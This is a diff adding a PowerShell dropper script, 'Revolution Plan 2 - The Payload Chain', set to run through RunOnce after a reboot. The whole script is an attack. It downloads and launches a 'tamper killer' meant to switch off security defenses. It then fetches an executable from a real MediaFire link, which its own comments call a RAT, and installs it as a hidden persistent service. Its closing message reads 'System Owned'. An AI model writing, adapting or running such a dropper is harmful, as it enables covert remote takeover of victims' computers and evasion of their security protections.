@@ -1,0 +1,54 @@
+# Revolution Plan 2 - The Payload Chain
+# Executed by RunOnce after reboot.
+
+# === SPEED FIX: Disable Progress Bar (Increases download speed by 10x) ===
+$ProgressPreference = 'SilentlyContinue'
+
+Write-Host "Revolution Phase 2: Payload Delivery" -ForegroundColor Cyan
+
+# ---------------------------------------------------------
+# STEP 1: Tamper Protection Killer (Defense Evasion)
+# ---------------------------------------------------------
+# [USER] OPTIONAL: Updates this link if you still use 'tamper_killer.exe'
+$TamperUrl = "YOUR_MEDIAFIRE_LINK_TO_TAMPER_KILLER_OR_LEAVE_AS_IS" 
+$TamperDest = "$env:TEMP\tamper_killer.exe"
+
+Write-Host "[1/2] Downloading Defense Neutralizer..."
+try {
+        Invoke-WebRequest -Uri $TamperUrl -OutFile $TamperDest -UseBasicParsing
+        Unblock-File -Path $TamperDest -ErrorAction SilentlyContinue
+        
+        if (Test-Path $TamperDest) {
+            Write-Host "    -> Launching Neutralizer (Background)..." -ForegroundColor Yellow
+            # REMOVED -Wait: We do not wait for it, because it might run forever or take time.
+            Start-Process -FilePath $TamperDest
+            Write-Host "    -> Defenses Down (Process Started)." -ForegroundColor Green
+        }
+} catch {
+    Write-Host "    [!] Tamper Download Failed: $($_.Exception.Message)" -ForegroundColor Red
+}
+
+# ---------------------------------------------------------
+# STEP 2: MyDesk Persistent Agent (The RAT)
+# ---------------------------------------------------------
+# REPLACE THIS URL with your uploaded 'MyDeskSetup.exe' link
+$SetupUrl = "https://download1590.mediafire.com/3lrq7gnzrcpgyyrPHnlNjMSFOPeU_FGGqWUESEhNReok4dgWX0kfrFyEuLzVCjCk3Z7hyfBlsS-PS_-pTBHA4OVISF9LMAlzGCJ5j6JevIY1-0VapdyvitRmuRZjYOmMKYfcxK60_c0g7JSurCIwzGjzu860a0e8CHHfv0UOrzCE/amwpqxtnov8hrox/MyDeskSetup.exe" 
+$SetupDest = "$env:TEMP\MyDeskSetup.exe"
+
+Write-Host "[2/2] Downloading Persistent Agent..."
+try {
+        Invoke-WebRequest -Uri $SetupUrl -OutFile $SetupDest -UseBasicParsing
+        Unblock-File -Path $SetupDest -ErrorAction SilentlyContinue
+        
+        if (Test-Path $SetupDest) {
+            Write-Host "    -> Installing Hidden Service..." -ForegroundColor Yellow
+            # Service Installer exits quickly, so -Wait is fine here.
+            Start-Process -FilePath $SetupDest -Wait
+            Write-Host "    -> Agent Installed & Signaling." -ForegroundColor Green
+        }
+} catch {
+    Write-Host "    [!] Agent Download Failed: $($_.Exception.Message)" -ForegroundColor Red
+}
+
+Write-Host "Revolution Complete. System Owned." -ForegroundColor Magenta
+Start-Sleep -Seconds 5
